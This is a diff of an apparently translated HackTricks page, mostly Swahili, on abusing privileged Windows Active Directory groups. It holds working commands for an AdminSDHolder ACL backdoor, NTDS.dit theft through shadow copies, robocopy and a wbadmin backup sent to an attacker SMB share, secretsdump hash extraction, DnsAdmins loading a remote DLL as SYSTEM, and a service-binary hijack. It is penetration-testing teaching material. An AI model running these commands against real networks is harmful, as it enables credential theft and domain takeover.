@@ -1,19 +1,19 @@
-# Vikundi vya Kipekee
+# Privileged Groups
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Vikundi Vinavyojulikana vyenye mamlaka ya usimamizi
+## Well Known groups with administration privileges
 
-- **Wasimamizi**
-- **Wasimamizi wa Kikoa**
-- **Wasimamizi wa Biashara**
+- **Administrators**
+- **Domain Admins**
+- **Enterprise Admins**
 
-## Opereta wa Akaunti
+## Account Operators
 
-Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Kituo cha Kikoa (DC).
+Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Domain Controller (DC).
 
 Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
 Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwa ndani kwenye DC01.
@@ -25,12 +25,12 @@ Orodha ya Udhibiti wa Ufikiaji (ACL) ya kundi la **AdminSDHolder** ni muhimu kwa
 Mshambuliaji anaweza kutumia hili kwa kubadilisha ACL ya kundi la **AdminSDHolder**, akitoa ruhusa kamili kwa mtumiaji wa kawaida. Hii itampa mtumiaji huyo udhibiti kamili juu ya vikundi vyote vilivyolindwa. Ikiwa ruhusa za mtumiaji huyu zitabadilishwa au kuondolewa, zitarudishwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.
 
 Amri za kupitia wanachama na kubadilisha ruhusa ni:
-```powershell
+```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-Inapatikana skripti ya kuharakisha mchakato wa urejeleaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Inapatikana skripti ili kuharakisha mchakato wa urejeleaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
 Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
@@ -40,13 +40,13 @@ Uanachama katika kundi hili unaruhusu kusoma vitu vilivyofutwa vya Active Direct
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Ufikiaji wa Kituo cha Kikoa
+### Domain Controller Access
 
-Ufikiaji wa faili kwenye DC umewekwa mipaka isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha ufikiaji.
+Upatikanaji wa faili kwenye DC umewekwa mipaka isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha upatikanaji.
 
-### Kuinua Haki
+### Privilege Escalation
 
-Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, linalowezesha utekelezaji wa amri zisizo na mipaka na kuinua haki:
+Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kuchunguza na kubadilisha ruhusa za huduma. Kundi la `Server Operators`, kwa mfano, lina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri za kiholela na kupandisha hadhi:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -54,10 +54,10 @@ Amri hii inaonyesha kwamba `Server Operators` wana ufikiaji kamili, wakiruhusu k
 
 ## Backup Operators
 
-Uanachama katika kundi la `Backup Operators` unatoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na haki za `SeBackup` na `SeRestore`. Haki hizi zinaruhusu kupita kwenye folda, kuorodhesha, na uwezo wa kunakili faili, hata bila ruhusa maalum, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia skripti maalum ni muhimu kwa mchakato huu.
+Uanachama katika kundi la `Backup Operators` unatoa ufikiaji wa mfumo wa faili wa `DC01` kutokana na haki za `SeBackup` na `SeRestore`. Haki hizi zinaruhusu kupita kwenye folda, kuorodhesha, na uwezo wa kunakili faili, hata bila ruhusa maalum, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Kutumia scripts maalum ni muhimu kwa mchakato huu.
 
 Ili kuorodhesha wanachama wa kundi, tekeleza:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 ### Local Attack
@@ -74,18 +74,18 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Pata na nakili faili kutoka kwa saraka zilizozuiliwa, kwa mfano:
+3. Pata na nakili faili kutoka kwa saraka zilizo na vizuizi, kwa mfano:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
 ### AD Attack
 
-Upatikanaji wa moja kwa moja wa mfumo wa faili wa Kituo cha Kikoa unaruhusu wizi wa hifadhidata ya `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za kikoa.
+Upatikanaji wa moja kwa moja wa mfumo wa faili wa Domain Controller unaruhusu wizi wa hifadhidata ya `NTDS.dit`, ambayo ina hash zote za NTLM za watumiaji na kompyuta za eneo.
 
 #### Using diskshadow.exe
 
-1. Tengeneza nakala ya kivuli ya diski ya `C`:
+1. Create a shadow copy of the `C` drive:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -102,7 +102,7 @@ exit
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-Vinginevyo, tumia `robocopy` kwa ajili ya nakala za faili:
+Mbali na hayo, tumia `robocopy` kwa ajili ya nakala za faili:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
@@ -117,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Kutumia wbadmin.exe
 
-1. Weka mfumo wa faili wa NTFS kwa ajili ya seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akidi za SMB kwenye mashine lengwa.
+1. Sanidi mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akreditivu za SMB kwenye mashine lengwa.
 2. Tumia `wbadmin.exe` kwa ajili ya akiba ya mfumo na uchimbaji wa `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -130,16 +130,16 @@ Kwa maonyesho ya vitendo, angalia [DEMO VIDEO WITH IPPSEC](https://www.youtube.c
 
 ## DnsAdmins
 
-Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka yenye mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wasimamizi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.
+Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka kwa haki za SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wasimamizi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.
 
-Ili kuorodhesha wajumbe wa kundi la DnsAdmins, tumia:
-```powershell
+Ili orodhesha wajumbe wa kundi la DnsAdmins, tumia:
+```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-### Teua DLL isiyokuwa na mipango
+### Teua DLL isiyokuwa na mipaka
 
-Wajumbe wanaweza kufanya seva ya DNS kupakia DLL isiyokuwa na mipango (iwe kwa ndani au kutoka kwa sehemu ya mbali) kwa kutumia amri kama:
-```powershell
+Wajumbe wanaweza kufanya seva ya DNS kupakia DLL isiyokuwa na mipaka (iwe kwa ndani au kutoka kwa sehemu ya mbali) kwa kutumia amri kama:
+```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
@@ -173,9 +173,9 @@ Pia inawezekana kutumia mimilib.dll kwa ajili ya utekelezaji wa amri, kuibadilis
 
 DnsAdmins wanaweza kubadilisha rekodi za DNS ili kufanya shambulio la Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima orodha ya kuzuia maswali ya kimataifa. Zana kama Responder au Inveigh zinaweza kutumika kwa ajili ya kudanganya na kukamata trafiki ya mtandao.
 
-### Wasomaji wa Kumbukumbu za Matukio
+### Wasilishi wa Kumbukumbu za Matukio
 Wajumbe wanaweza kufikia kumbukumbu za matukio, huenda wakapata taarifa nyeti kama nywila za maandiko au maelezo ya utekelezaji wa amri:
-```powershell
+```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
@@ -183,17 +183,17 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ## Exchange Windows Permissions
 
 Kikundi hiki kinaweza kubadilisha DACLs kwenye kituo cha kikoa, huenda kikatoa ruhusa za DCSync. Mbinu za kupandisha hadhi zinazotumia kikundi hiki zimeelezewa katika repo ya Exchange-AD-Privesc ya GitHub.
-```powershell
+```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Wataalam wa Hyper-V
 
-Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
+Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambayo inaweza kutumika kuteka udhibiti wa Wasimamizi wa Kikoa wa virtual. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
 
 ### Mfano wa Kutumia
 
-Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumiwa na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
+Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumika na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyo na ulinzi na kuibadilisha na executable mbaya:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -209,10 +209,10 @@ Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojuli
 
 #### Opereta wa Print
 
-Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kuifunga, na kusimamia printa. Ili kutekeleza haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na kiwango, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
+Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kuifunga, na kusimamia printa. Ili kutumia haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na hadhi, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
 
 Ili kuorodhesha wajumbe wa kundi hili, amri ifuatayo ya PowerShell inatumika:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 Kwa mbinu za kina za unyakuzi zinazohusiana na **`SeLoadDriverPrivilege`**, mtu anapaswa kutafuta rasilimali maalum za usalama.
@@ -220,7 +220,7 @@ Kwa mbinu za kina za unyakuzi zinazohusiana na **`SeLoadDriverPrivilege`**, mtu 
 #### Watumiaji wa Desktop ya Kijijini
 
 Wajumbe wa kundi hili wanapewa ufikiaji wa PCs kupitia Protokali ya Desktop ya Kijijini (RDP). Ili kuhesabu wajumbe hawa, amri za PowerShell zinapatikana:
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
@@ -228,17 +228,17 @@ Maelezo zaidi kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za
 
 #### Watumiaji wa Usimamizi wa Kijijini
 
-Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhesabuji wa wajumbe hawa unafanywa kupitia:
-```powershell
+Wajumbe wanaweza kufikia PCs kupitia **Windows Remote Management (WinRM)**. Uhesabu wa wajumbe hawa unafanywa kupitia:
+```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
 Kwa mbinu za unyakuzi zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kutumika.
 
-#### Watoa Huduma za Seva
+#### Watoa Huduma wa Seva
 
-Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Wajibu wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo. Ili kuorodhesha wanachama, amri iliyotolewa ni:
-```powershell
+Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Wasimamizi wa Kikoa, ikiwa ni pamoja na ruhusa za kuhifadhi na kurejesha, kubadilisha muda wa mfumo, na kuzima mfumo. Ili kuhesabu wanachama, amri iliyotolewa ni:
+```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
 ## References <a href="#references" id="references"></a>
